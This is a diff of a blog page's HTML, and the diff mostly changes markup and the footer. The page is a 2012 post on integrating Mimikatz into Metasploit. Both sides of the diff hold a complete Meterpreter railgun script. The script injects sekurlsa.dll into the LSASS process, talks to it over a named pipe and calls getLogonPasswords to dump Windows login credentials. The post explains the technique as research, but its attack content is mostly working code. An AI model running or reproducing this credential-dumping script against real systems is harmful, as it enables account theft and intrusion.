@@ -34,8 +34,8 @@ Here is my first step to that end; a railgun based Meterpreter script. Now befor
 
 <meta itemprop="name" content="Integration of Mimikatz into Metasploit Stage1">
 <meta itemprop="description" content="One of the powers of Metasploit is it&rsquo;s ability to stay memory resident. Through the use of reflective DLL injection even keeping new functionality the attack loads from ever touching disk. Well, the first thing I wanted to do with Mimikatz is get to that same level.
-Here is my first step to that end; a railgun based Meterpreter script. Now before going all reflective with it I needed to understand how the DLL worked."><meta itemprop="datePublished" content="2012-06-15T14:55:55&#43;00:00" />
-<meta itemprop="dateModified" content="2012-06-15T14:55:55&#43;00:00" />
+Here is my first step to that end; a railgun based Meterpreter script. Now before going all reflective with it I needed to understand how the DLL worked."><meta itemprop="datePublished" content="2012-06-15T14:55:55+00:00" />
+<meta itemprop="dateModified" content="2012-06-15T14:55:55+00:00" />
 <meta itemprop="wordCount" content="550">
 <meta itemprop="keywords" content="" />
 <meta name="twitter:card" content="summary"/>
@@ -55,7 +55,7 @@ Here is my first step to that end; a railgun based Meterpreter script. Now befor
 
 
 
-    <meta property="article:published_time" content="2012-06-15 14:55:55 &#43;0000 &#43;0000" />
+    <meta property="article:published_time" content="2012-06-15 14:55:55 &#43;0000 UTC" />
 
 
 
@@ -132,73 +132,73 @@ Here is my first step to that end; a railgun based Meterpreter script. Now befor
                 <p>One of the powers of Metasploit is it&rsquo;s ability to stay memory resident. Through the use of reflective DLL injection even keeping new functionality the attack loads from ever touching disk. Well, the first thing I wanted to do with Mimikatz is get to that same level.</p>
 <p>Here is my first step to that end; a railgun based Meterpreter script. Now before going all reflective with it I needed to understand how the DLL worked. Thankfully <a href="https://twitter.com/gentilkiwi">@gentilkiwi</a> stepped in and stopped my head from getting bloody. In this first step we will be removing the need for the mimikatz.exe binary, still needing the DLL to be uploaded, but we&rsquo;ll get there in the subsequent posts.</p>
 <p>Ignore the do_cmd for now and I stepped through <a href="/blog/2011/5/30/remote-dll-injection-with-meterpreter.html">remote DLL injection here</a>. So the first odd lines is </p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ruby" data-lang="ruby">handle <span style="color:#f92672">=</span> client<span style="color:#f92672">.</span>railgun<span style="color:#f92672">.</span>kernel32<span style="color:#f92672">.</span>CreateNamedPipeW(<span style="color:#e6db74">&#39;\\\\.\\pipe\\kiwi\\mimikatz&#39;</span>, <span style="color:#e6db74">&#39;PIPE_ACCESS_DUPLEX&#39;</span>, <span style="color:#e6db74">&#39;PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT&#39;</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">30000</span>,<span style="color:#66d9ef">nil</span>)<span style="color:#f92672">[</span><span style="color:#e6db74">&#39;return&#39;</span><span style="color:#f92672">]</span>
-connectedlsass <span style="color:#f92672">=</span> client<span style="color:#f92672">.</span>railgun<span style="color:#f92672">.</span>kernel32<span style="color:#f92672">.</span>ConnectNamedPipe(handle,<span style="color:#66d9ef">nil</span>)
-</code></pre></div><p>Essentially these connect to the <a href="http://en.wikipedia.org/wiki/Named_pipe">Named Pipe</a> that the sekurlsa.dll uses to talk to the mimikatz.exe in it&rsquo;s normal operation. Then we just use the windows API call &ldquo;ReadFile&rdquo; from there on out.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ruby" data-lang="ruby">client<span style="color:#f92672">.</span>railgun<span style="color:#f92672">.</span>kernel32<span style="color:#f92672">.</span>ReadFile(handle,<span style="color:#ae81ff">248</span>,<span style="color:#ae81ff">248</span>,<span style="color:#ae81ff">4</span>,<span style="color:#66d9ef">nil</span>)
-</code></pre></div><p>One of the draw backs to doing this all remotely is that Railgun doesn&rsquo;t have the memory management insight like the Windows OS does. Being able to know when pipes are ready to be read or written to is  a bit of a challenge and the call hangs your IRB / meterpreter session if you get it wrong. I&rsquo;ve overcome this for the initial &ldquo;banner&rdquo; that sekurlsa writes by knowing the exact length (248 bytes in this case) of the text. For subsequent commands like &ldquo;ping&rdquo; and &ldquo;getLogonPasswords&rdquo; I simply have to read one character at a time, which is a slow process but removes any chance of getting hung. (Two bytes for every Unicode character)</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ruby" data-lang="ruby"><span style="display:flex;"><span>handle <span style="color:#f92672">=</span> client<span style="color:#f92672">.</span>railgun<span style="color:#f92672">.</span>kernel32<span style="color:#f92672">.</span>CreateNamedPipeW(<span style="color:#e6db74">&#39;\\\\.\\pipe\\kiwi\\mimikatz&#39;</span>, <span style="color:#e6db74">&#39;PIPE_ACCESS_DUPLEX&#39;</span>, <span style="color:#e6db74">&#39;PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT&#39;</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">30000</span>,<span style="color:#66d9ef">nil</span>)<span style="color:#f92672">[</span><span style="color:#e6db74">&#39;return&#39;</span><span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>connectedlsass <span style="color:#f92672">=</span> client<span style="color:#f92672">.</span>railgun<span style="color:#f92672">.</span>kernel32<span style="color:#f92672">.</span>ConnectNamedPipe(handle,<span style="color:#66d9ef">nil</span>)
+</span></span></code></pre></div><p>Essentially these connect to the <a href="http://en.wikipedia.org/wiki/Named_pipe">Named Pipe</a> that the sekurlsa.dll uses to talk to the mimikatz.exe in it&rsquo;s normal operation. Then we just use the windows API call &ldquo;ReadFile&rdquo; from there on out.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ruby" data-lang="ruby"><span style="display:flex;"><span>client<span style="color:#f92672">.</span>railgun<span style="color:#f92672">.</span>kernel32<span style="color:#f92672">.</span>ReadFile(handle,<span style="color:#ae81ff">248</span>,<span style="color:#ae81ff">248</span>,<span style="color:#ae81ff">4</span>,<span style="color:#66d9ef">nil</span>)
+</span></span></code></pre></div><p>One of the draw backs to doing this all remotely is that Railgun doesn&rsquo;t have the memory management insight like the Windows OS does. Being able to know when pipes are ready to be read or written to is  a bit of a challenge and the call hangs your IRB / meterpreter session if you get it wrong. I&rsquo;ve overcome this for the initial &ldquo;banner&rdquo; that sekurlsa writes by knowing the exact length (248 bytes in this case) of the text. For subsequent commands like &ldquo;ping&rdquo; and &ldquo;getLogonPasswords&rdquo; I simply have to read one character at a time, which is a slow process but removes any chance of getting hung. (Two bytes for every Unicode character)</p>
 <p>If you have any questions on how/why this works or have a better way please leave your comments and questions below or hit me up on twitter!</p>
 <p>Meterpreter Script:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ruby" data-lang="ruby"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">do_cmd</span>(handle,cmd)
-	ucommand <span style="color:#f92672">=</span> <span style="color:#66d9ef">Rex</span><span style="color:#f92672">::</span><span style="color:#66d9ef">Text</span><span style="color:#f92672">.</span>to_unicode(cmd)
-	sendcmd <span style="color:#f92672">=</span> client<span style="color:#f92672">.</span>railgun<span style="color:#f92672">.</span>kernel32<span style="color:#f92672">.</span>WriteFile(handle,ucommand,ucommand<span style="color:#f92672">.</span>size,<span style="color:#ae81ff">4</span>,<span style="color:#66d9ef">nil</span>)
-	good2go <span style="color:#f92672">=</span> <span style="color:#66d9ef">false</span>
-	newline <span style="color:#f92672">=</span> <span style="color:#66d9ef">false</span>
-	readstring <span style="color:#f92672">=</span> <span style="color:#f92672">[]</span>
-	<span style="color:#66d9ef">while</span> good2go <span style="color:#f92672">==</span> <span style="color:#66d9ef">false</span>
-		<span style="color:#75715e"># Have to pull data 1 unicode character at a time</span>
-		<span style="color:#75715e"># this is because the pipe won&#39;t write or read if</span>
-		<span style="color:#75715e"># too much was written or read by the &#34;client&#34; (us)</span>
-		pull <span style="color:#f92672">=</span> client<span style="color:#f92672">.</span>railgun<span style="color:#f92672">.</span>kernel32<span style="color:#f92672">.</span>ReadFile(handle,<span style="color:#ae81ff">2</span>,<span style="color:#ae81ff">2</span>,<span style="color:#ae81ff">4</span>,<span style="color:#66d9ef">nil</span>)
-		<span style="color:#75715e"># Check to see if our end of read check is there: n000 @00</span>
-		<span style="color:#66d9ef">if</span> pull<span style="color:#f92672">[</span><span style="color:#e6db74">&#39;lpBuffer&#39;</span><span style="color:#f92672">]</span> <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;@00&#34;</span> <span style="color:#f92672">and</span> newline <span style="color:#f92672">==</span> <span style="color:#66d9ef">true</span>
-			good2go <span style="color:#f92672">=</span> <span style="color:#66d9ef">true</span>
-		<span style="color:#66d9ef">else</span>
-			readstring <span style="color:#f92672">&lt;&lt;</span> pull<span style="color:#f92672">[</span><span style="color:#e6db74">&#39;lpBuffer&#39;</span><span style="color:#f92672">]</span>
-		<span style="color:#66d9ef">end</span>
-		
-		<span style="color:#75715e"># Ready the newline var for previous check on next loop</span>
-		<span style="color:#66d9ef">if</span> pull<span style="color:#f92672">[</span><span style="color:#e6db74">&#39;lpBuffer&#39;</span><span style="color:#f92672">]</span> <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;n00&#34;</span>
-			newline <span style="color:#f92672">=</span> <span style="color:#66d9ef">true</span>
-		<span style="color:#66d9ef">else</span>
-			newline <span style="color:#f92672">=</span> <span style="color:#66d9ef">false</span>
-		<span style="color:#66d9ef">end</span>
-	<span style="color:#66d9ef">end</span>
-	
-	print_status(readstring<span style="color:#f92672">.</span>join(<span style="color:#e6db74">&#34;&#34;</span>))
-<span style="color:#66d9ef">end</span>
-
-print_status(<span style="color:#e6db74">&#34;x86 Detected - Using x86 mimikatz&#34;</span>)
-handle <span style="color:#f92672">=</span> client<span style="color:#f92672">.</span>railgun<span style="color:#f92672">.</span>kernel32<span style="color:#f92672">.</span>CreateNamedPipeW(<span style="color:#e6db74">&#39;\\\\.\\pipe\\kiwi\\mimikatz&#39;</span>, <span style="color:#e6db74">&#39;PIPE_ACCESS_DUPLEX&#39;</span>, <span style="color:#e6db74">&#39;PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT&#39;</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">30000</span>,<span style="color:#66d9ef">nil</span>)<span style="color:#f92672">[</span><span style="color:#e6db74">&#39;return&#39;</span><span style="color:#f92672">]</span>
-print_status(<span style="color:#e6db74">&#34;Handle: </span><span style="color:#e6db74">#{</span>handle<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
-framework<span style="color:#f92672">.</span>threads<span style="color:#f92672">.</span>spawn(<span style="color:#e6db74">&#39;injectlsass&#39;</span>,<span style="color:#66d9ef">false</span>) {
-	pid <span style="color:#f92672">=</span> client<span style="color:#f92672">.</span>sys<span style="color:#f92672">.</span>process<span style="color:#f92672">[</span><span style="color:#e6db74">&#39;lsass.exe&#39;</span><span style="color:#f92672">]</span>
-	print_status(<span style="color:#e6db74">&#34;LSASS located at PID: </span><span style="color:#e6db74">#{</span>pid<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
-	pathtomimi <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;C:</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">sekurlsa.dll&#34;</span>
-
-	pay <span style="color:#f92672">=</span> client<span style="color:#f92672">.</span>framework<span style="color:#f92672">.</span>payloads<span style="color:#f92672">.</span>create(<span style="color:#e6db74">&#34;windows/loadlibrary&#34;</span>)
-	pay<span style="color:#f92672">.</span>datastore<span style="color:#f92672">[</span><span style="color:#e6db74">&#34;DLL&#34;</span><span style="color:#f92672">]</span> <span style="color:#f92672">=</span> pathtomimi
-	pay<span style="color:#f92672">.</span>datastore<span style="color:#f92672">[</span><span style="color:#e6db74">&#34;EXITFUNC&#34;</span><span style="color:#f92672">]</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;thread&#39;</span>
-
-	raw <span style="color:#f92672">=</span> pay<span style="color:#f92672">.</span>generate
-	targetprocess <span style="color:#f92672">=</span> client<span style="color:#f92672">.</span>sys<span style="color:#f92672">.</span>process<span style="color:#f92672">.</span>open(pid, <span style="color:#66d9ef">PROCESS_ALL_ACCESS</span>)
-	mem <span style="color:#f92672">=</span> targetprocess<span style="color:#f92672">.</span>memory<span style="color:#f92672">.</span>allocate(raw<span style="color:#f92672">.</span>length <span style="color:#f92672">+</span> (<span style="color:#ae81ff">30024</span>))
-	targetprocess<span style="color:#f92672">.</span>memory<span style="color:#f92672">.</span>write(mem, raw)
-	sleep(<span style="color:#ae81ff">2</span>)
-	targetprocess<span style="color:#f92672">.</span>thread<span style="color:#f92672">.</span>create(mem, <span style="color:#ae81ff">0</span>)
-	print_status(<span style="color:#e6db74">&#34;Successfully Injected into LSASS&#34;</span>)
-}
-print_status(<span style="color:#e6db74">&#34;Waiting for LSASS injection to complete&#34;</span>)
-connectedlsass <span style="color:#f92672">=</span> client<span style="color:#f92672">.</span>railgun<span style="color:#f92672">.</span>kernel32<span style="color:#f92672">.</span>ConnectNamedPipe(handle,<span style="color:#66d9ef">nil</span>)
-print_status(<span style="color:#e6db74">&#34;Mimikatz has called home, ready for command&#34;</span>)
-sleep(<span style="color:#ae81ff">2</span>)
-print_status(<span style="color:#e6db74">&#34;Reading banner&#34;</span>)
-client<span style="color:#f92672">.</span>railgun<span style="color:#f92672">.</span>kernel32<span style="color:#f92672">.</span>ReadFile(handle,<span style="color:#ae81ff">248</span>,<span style="color:#ae81ff">248</span>,<span style="color:#ae81ff">4</span>,<span style="color:#66d9ef">nil</span>)
-print_status(<span style="color:#e6db74">&#34;Doing a quick ping to make sure things are working...&#34;</span>)
-do_cmd(handle,<span style="color:#e6db74">&#39;ping&#39;</span>)
-print_status(<span style="color:#e6db74">&#34;If you made it this far it worked, doing getLogonPasswords&#34;</span>)
-do_cmd(handle, <span style="color:#e6db74">&#39;getLogonPasswords&#39;</span>)
-</code></pre></div>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ruby" data-lang="ruby"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">do_cmd</span>(handle,cmd)
+</span></span><span style="display:flex;"><span>	ucommand <span style="color:#f92672">=</span> <span style="color:#66d9ef">Rex</span><span style="color:#f92672">::</span><span style="color:#66d9ef">Text</span><span style="color:#f92672">.</span>to_unicode(cmd)
+</span></span><span style="display:flex;"><span>	sendcmd <span style="color:#f92672">=</span> client<span style="color:#f92672">.</span>railgun<span style="color:#f92672">.</span>kernel32<span style="color:#f92672">.</span>WriteFile(handle,ucommand,ucommand<span style="color:#f92672">.</span>size,<span style="color:#ae81ff">4</span>,<span style="color:#66d9ef">nil</span>)
+</span></span><span style="display:flex;"><span>	good2go <span style="color:#f92672">=</span> <span style="color:#66d9ef">false</span>
+</span></span><span style="display:flex;"><span>	newline <span style="color:#f92672">=</span> <span style="color:#66d9ef">false</span>
+</span></span><span style="display:flex;"><span>	readstring <span style="color:#f92672">=</span> <span style="color:#f92672">[]</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">while</span> good2go <span style="color:#f92672">==</span> <span style="color:#66d9ef">false</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#75715e"># Have to pull data 1 unicode character at a time</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#75715e"># this is because the pipe won&#39;t write or read if</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#75715e"># too much was written or read by the &#34;client&#34; (us)</span>
+</span></span><span style="display:flex;"><span>		pull <span style="color:#f92672">=</span> client<span style="color:#f92672">.</span>railgun<span style="color:#f92672">.</span>kernel32<span style="color:#f92672">.</span>ReadFile(handle,<span style="color:#ae81ff">2</span>,<span style="color:#ae81ff">2</span>,<span style="color:#ae81ff">4</span>,<span style="color:#66d9ef">nil</span>)
+</span></span><span style="display:flex;"><span>		<span style="color:#75715e"># Check to see if our end of read check is there: n000 @00</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> pull<span style="color:#f92672">[</span><span style="color:#e6db74">&#39;lpBuffer&#39;</span><span style="color:#f92672">]</span> <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;@00&#34;</span> <span style="color:#f92672">and</span> newline <span style="color:#f92672">==</span> <span style="color:#66d9ef">true</span>
+</span></span><span style="display:flex;"><span>			good2go <span style="color:#f92672">=</span> <span style="color:#66d9ef">true</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">else</span>
+</span></span><span style="display:flex;"><span>			readstring <span style="color:#f92672">&lt;&lt;</span> pull<span style="color:#f92672">[</span><span style="color:#e6db74">&#39;lpBuffer&#39;</span><span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">end</span>
+</span></span><span style="display:flex;"><span>		
+</span></span><span style="display:flex;"><span>		<span style="color:#75715e"># Ready the newline var for previous check on next loop</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> pull<span style="color:#f92672">[</span><span style="color:#e6db74">&#39;lpBuffer&#39;</span><span style="color:#f92672">]</span> <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;n00&#34;</span>
+</span></span><span style="display:flex;"><span>			newline <span style="color:#f92672">=</span> <span style="color:#66d9ef">true</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">else</span>
+</span></span><span style="display:flex;"><span>			newline <span style="color:#f92672">=</span> <span style="color:#66d9ef">false</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">end</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">end</span>
+</span></span><span style="display:flex;"><span>	
+</span></span><span style="display:flex;"><span>	print_status(readstring<span style="color:#f92672">.</span>join(<span style="color:#e6db74">&#34;&#34;</span>))
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">end</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print_status(<span style="color:#e6db74">&#34;x86 Detected - Using x86 mimikatz&#34;</span>)
+</span></span><span style="display:flex;"><span>handle <span style="color:#f92672">=</span> client<span style="color:#f92672">.</span>railgun<span style="color:#f92672">.</span>kernel32<span style="color:#f92672">.</span>CreateNamedPipeW(<span style="color:#e6db74">&#39;\\\\.\\pipe\\kiwi\\mimikatz&#39;</span>, <span style="color:#e6db74">&#39;PIPE_ACCESS_DUPLEX&#39;</span>, <span style="color:#e6db74">&#39;PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT&#39;</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">30000</span>,<span style="color:#66d9ef">nil</span>)<span style="color:#f92672">[</span><span style="color:#e6db74">&#39;return&#39;</span><span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>print_status(<span style="color:#e6db74">&#34;Handle: </span><span style="color:#e6db74">#{</span>handle<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>framework<span style="color:#f92672">.</span>threads<span style="color:#f92672">.</span>spawn(<span style="color:#e6db74">&#39;injectlsass&#39;</span>,<span style="color:#66d9ef">false</span>) {
+</span></span><span style="display:flex;"><span>	pid <span style="color:#f92672">=</span> client<span style="color:#f92672">.</span>sys<span style="color:#f92672">.</span>process<span style="color:#f92672">[</span><span style="color:#e6db74">&#39;lsass.exe&#39;</span><span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>	print_status(<span style="color:#e6db74">&#34;LSASS located at PID: </span><span style="color:#e6db74">#{</span>pid<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>	pathtomimi <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;C:</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">sekurlsa.dll&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	pay <span style="color:#f92672">=</span> client<span style="color:#f92672">.</span>framework<span style="color:#f92672">.</span>payloads<span style="color:#f92672">.</span>create(<span style="color:#e6db74">&#34;windows/loadlibrary&#34;</span>)
+</span></span><span style="display:flex;"><span>	pay<span style="color:#f92672">.</span>datastore<span style="color:#f92672">[</span><span style="color:#e6db74">&#34;DLL&#34;</span><span style="color:#f92672">]</span> <span style="color:#f92672">=</span> pathtomimi
+</span></span><span style="display:flex;"><span>	pay<span style="color:#f92672">.</span>datastore<span style="color:#f92672">[</span><span style="color:#e6db74">&#34;EXITFUNC&#34;</span><span style="color:#f92672">]</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;thread&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	raw <span style="color:#f92672">=</span> pay<span style="color:#f92672">.</span>generate
+</span></span><span style="display:flex;"><span>	targetprocess <span style="color:#f92672">=</span> client<span style="color:#f92672">.</span>sys<span style="color:#f92672">.</span>process<span style="color:#f92672">.</span>open(pid, <span style="color:#66d9ef">PROCESS_ALL_ACCESS</span>)
+</span></span><span style="display:flex;"><span>	mem <span style="color:#f92672">=</span> targetprocess<span style="color:#f92672">.</span>memory<span style="color:#f92672">.</span>allocate(raw<span style="color:#f92672">.</span>length <span style="color:#f92672">+</span> (<span style="color:#ae81ff">30024</span>))
+</span></span><span style="display:flex;"><span>	targetprocess<span style="color:#f92672">.</span>memory<span style="color:#f92672">.</span>write(mem, raw)
+</span></span><span style="display:flex;"><span>	sleep(<span style="color:#ae81ff">2</span>)
+</span></span><span style="display:flex;"><span>	targetprocess<span style="color:#f92672">.</span>thread<span style="color:#f92672">.</span>create(mem, <span style="color:#ae81ff">0</span>)
+</span></span><span style="display:flex;"><span>	print_status(<span style="color:#e6db74">&#34;Successfully Injected into LSASS&#34;</span>)
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>print_status(<span style="color:#e6db74">&#34;Waiting for LSASS injection to complete&#34;</span>)
+</span></span><span style="display:flex;"><span>connectedlsass <span style="color:#f92672">=</span> client<span style="color:#f92672">.</span>railgun<span style="color:#f92672">.</span>kernel32<span style="color:#f92672">.</span>ConnectNamedPipe(handle,<span style="color:#66d9ef">nil</span>)
+</span></span><span style="display:flex;"><span>print_status(<span style="color:#e6db74">&#34;Mimikatz has called home, ready for command&#34;</span>)
+</span></span><span style="display:flex;"><span>sleep(<span style="color:#ae81ff">2</span>)
+</span></span><span style="display:flex;"><span>print_status(<span style="color:#e6db74">&#34;Reading banner&#34;</span>)
+</span></span><span style="display:flex;"><span>client<span style="color:#f92672">.</span>railgun<span style="color:#f92672">.</span>kernel32<span style="color:#f92672">.</span>ReadFile(handle,<span style="color:#ae81ff">248</span>,<span style="color:#ae81ff">248</span>,<span style="color:#ae81ff">4</span>,<span style="color:#66d9ef">nil</span>)
+</span></span><span style="display:flex;"><span>print_status(<span style="color:#e6db74">&#34;Doing a quick ping to make sure things are working...&#34;</span>)
+</span></span><span style="display:flex;"><span>do_cmd(handle,<span style="color:#e6db74">&#39;ping&#39;</span>)
+</span></span><span style="display:flex;"><span>print_status(<span style="color:#e6db74">&#34;If you made it this far it worked, doing getLogonPasswords&#34;</span>)
+</span></span><span style="display:flex;"><span>do_cmd(handle, <span style="color:#e6db74">&#39;getLogonPasswords&#39;</span>)
+</span></span></code></pre></div>
             </div>
         </article>
 
@@ -225,7 +225,7 @@ do_cmd(handle, <span style="color:#e6db74">&#39;getLogonPasswords&#39;</span>)
                 <footer class="footer">
     <div class="footer__inner">
         <div class="footer__content">
-            <span>&copy; 2021</span>
+            <span>&copy; 2023</span>
             
             <span><a href="https://malicious.link/post/index.xml" target="_blank" title="rss"><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 20 20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 0 1 9 9"></path><path d="M4 4a16 16 0 0 1 16 16"></path><circle cx="5" cy="19" r="1"></circle></svg></a></span>
         </div>
@@ -233,7 +233,7 @@ do_cmd(handle, <span style="color:#e6db74">&#39;getLogonPasswords&#39;</span>)
     <div class="footer__inner">
         <div class="footer__content">
             <span>Powered by <a href="http://gohugo.io">Hugo</a></span>
-            <span>Made with &#10084; by <a href="https://github.com/rhazdon">Djordje Atlialp</a></span>
+            <span>Made with &#10084; by <a href="https://github.com/mubix">mubix</a> - Theme by <a href="https://github.com/rhazdon/">Djordje Atlialp</a></span>
           </div>
     </div>
 </footer>
@@ -246,7 +246,7 @@ do_cmd(handle, <span style="color:#e6db74">&#39;getLogonPasswords&#39;</span>)
 
 
 
-<script type="text/javascript" src="/bundle.min.a0f363fdf81cdc5cfacc447a79c33189eb000d090336cd04aac8ee256f423b3133b836c281944c19c75e38d0b0b449f01ce5807e37798b7ac94ac1db51983fc4.js" integrity="sha512-oPNj/fgc3Fz6zER6ecMxiesADQkDNs0EqsjuJW9COzEzuDbCgZRMGcdeONCwtEnwHOWAfjd5i3rJSsHbUZg/xA=="></script>
+<script type="text/javascript" src="/bundle.min.8cc3758efe48ef82e2eb9a5f317b44c0805353a43762207be6fe8ffb05815cce7a19d37f6bf387c378a3bdfc3029981668d645374a33db4ee3480e15a4bfdc7c.js" integrity="sha512-jMN1jv5I74Li65pfMXtEwIBTU6Q3YiB75v6P&#43;wWBXM56GdN/a/OHw3ijvfwwKZgWaNZFN0oz207jSA4VpL/cfA=="></script>
 
 
 
